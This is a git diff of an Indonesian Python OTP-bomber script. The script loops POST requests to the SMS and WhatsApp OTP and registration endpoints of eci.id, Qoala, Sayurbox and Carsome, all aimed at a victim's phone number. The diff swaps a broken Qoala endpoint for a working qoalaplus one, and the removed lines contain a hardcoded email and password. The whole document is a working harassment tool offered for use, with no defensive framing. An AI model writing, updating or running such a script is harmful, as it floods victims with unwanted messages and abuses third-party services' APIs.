@@ -9,7 +9,7 @@ def mengetik(c):
        for e in c + "\n":
           sys.stdout.write(e)
           sys.stdout.flush()
-          time.sleep(0.03)
+          time.sleep(0.01)
 
 #warna liat
 P = '\x1b[1;97m' # PUTIH
@@ -50,7 +50,7 @@ mengetik(f"{H} ∎∎∎∎∎∎  L  ∎∎∎∎∎∎∎∎∎∎  ∎∎∎�
 mengetik(f"{H} ∎∎∎∎∎∎∎     ∎∎∎∎∎∎∎∎∎       ∎∎∎       ∎∎∎∎∎∎")
 mengetik(f"{H} ∎∎∎∎∎∎∎∎  B  ∎∎∎∎∎∎∎∎  ∎  ∎∎∎∎∎∎∎∎∎  ∎∎∎∎∎∎∎")
 mengetik(f"{H} ∎∎∎∎∎∎∎∎∎  A  ∎∎∎∎∎∎∎  ∎∎  ∎∎∎∎∎∎  ∎∎∎∎∎∎∎∎∎")
-mengetik(f"{H} ∎∎∎∎∎∎∎∎∎∎  H  ∎∎∎∎∎∎  ∎∎∎  ∎∎∎      ∎∎∎∎∎∎∎")
+mengetik(f"{H} ∎∎∎∎∎∎∎∎∎∎  H  ∎∎∎∎∎∎  ∎∎∎  ∎∎∎       ∎∎∎∎∎∎")
 mengetik(f"{H} ∎∎∎∎∎∎∎∎∎∎∎  A  ∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎")
 mengetik(f"{H} ∎∎∎∎∎∎∎∎∎∎∎∎  N  ∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎")
 print("")
@@ -97,18 +97,19 @@ headers_eci = {
 "Referer" : "https://eci.id/register",
 "Accept-Encoding" : "gzip, deflate, br",
 "Accept-Language" : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-headers_qoala = {
-'Host': 'api.qoala.app',
-'content-length': '207',
-'accept': 'application/json, text/plain, */*',
-'user-agent': 'Mozilla/5.0 (Linux; Android 11; Redmi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36',
-'content-type': 'application/json;charset=UTF-8',
-'origin': 'https://www.qoala.app',
-'sec-fetch-site': 'same-site',
-'sec-fetch-mode': 'cors',                                                                                                                               'sec-fetch-dest': 'empty',
-'referer': 'https://www.qoala.app/',
-'accept-encoding': 'gzip, deflate, br',
-'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+headers_qoalaplus = {                                                            
+"Host": "api.qoalaplus.com",                                                     
+"content-length": "48",                                                          
+"accept": "application/json, text/plain, */*",                                   
+"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36",
+"content-type": "application/json",                                              
+"origin": "https://www.qoalaplus.com",                                           
+"sec-fetch-site": "same-site",
+"sec-fetch-mode": "cors",                                                        
+"sec-fetch-dest": "empty",                                                       
+"referer": "https://www.qoalaplus.com/",                                         
+"accept-encoding": "gzip, deflate, br",                                          
+"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 headers_sayur = {
 'Host': 'www.sayurbox.com',
 'content-length': '289',
@@ -144,7 +145,7 @@ headers_carsome = {
 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 # Data
 data_eci = json.dumps({"identity":"0"+nomer})
-data_qoala = json.dumps({"fullName":"Khoirul Anam","email":"ubayganteng618@gmail.com","phoneNumber":"+62"+nomer,"identityType":"KTP","nationality":"ID","password":"anam12345@A","passwordConfirmation":"anam12345@A","lang":"id"})
+data_qoalaplus = json.dumps({"phone_number":"+62"+nomer,"channel":"WhatsApp"})
 data_sayur = json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+nomer},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
 data_carsome = json.dumps({"username":nomer,"optType":1})
 
@@ -161,7 +162,7 @@ for k in range(jumlah):
     print(f"{M}--> MAAF SMS ECI GAGAL",k)
 for k in range(jumlah):
   k += 1
-  pos_qoala = requests.post("https://api.qoala.app/api/registrations",headers=headers_qoala,data=data_qoala).text
+  pos_qoala = requests.post("https://api.qoalaplus.com/go-agent/v2/user/register",headers=headers_qoalaplus,data=data_qoalaplus).text
   if "200" in pos_qoala:
     time.sleep(3)
     print(f"{H}____________________________________________")
